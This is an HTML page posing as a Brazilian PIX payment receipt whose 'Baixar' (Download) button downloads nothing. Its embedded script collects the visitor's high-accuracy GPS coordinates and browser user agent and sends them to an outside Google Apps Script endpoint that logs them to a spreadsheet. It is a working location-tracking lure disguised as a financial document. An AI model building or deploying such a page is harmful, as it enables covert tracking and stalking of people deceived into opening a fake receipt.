<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Comprovante PIX</title>
  <style>
    body {
      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial;
      margin: 2rem;
    }
    h1.titulo {
      font-size: 1.2rem;
      font-weight: bold;
      text-align: center;
    }
    img.comprovante {
      display: block;
      margin: 10px auto;
      max-width: 100%;
      height: auto;
    }
    button {
      padding: 0.7rem 1.2rem;
      font-size: 1rem;
      border-radius: 8px;
      border: 1px solid rgba(0,0,0,.1);
      cursor: pointer;
      display: block;
      margin: 20px auto;
    }
  </style>
</head>
<body>

  <h1 class="titulo">Comprovante de transferência (PIX)</h1>

  <!-- Imagem do comprovante -->
  <img src="img.jpg" alt="Comprovante PIX" class="comprovante">

  <h1 class="titulo">29 Set 2025 - 14:35</h1>

  <button id="sendBtn">Baixar</button>

  <!-- SCRIPT DE GEOLOCALIZAÇÃO + ENVIO PARA GOOGLE SHEET -->
  <script>
  const btn = document.getElementById('sendBtn');

  async function sendLocation(position){
    const coords = position.coords;

    const payload = {
      latitude: coords.latitude,
      longitude: coords.longitude,
      accuracy: coords.accuracy,
      userAgent: navigator.userAgent
    };

    const url = "https://script.google.com/macros/s/AKfycbxVbCO66Z7sc8D3a8DKMvElYI86AaRHBRYkcdElpjiSLV4oTQZGvJ_LNiCwQ8MRjsct/exec";

    try {
      await fetch(url, {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      alert("Localização enviada com sucesso!");
    } catch(err){
      alert("Falha ao enviar localização.");
    }
  }

  btn.addEventListener('click', () => {
    if (!("geolocation" in navigator)) {
      alert("Seu dispositivo não suporta geolocalização.");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      pos => sendLocation(pos),
      err => alert("Não foi possível obter a localização."),
      { enableHighAccuracy: true }
    );
  });
  </script>

</body>
</html>
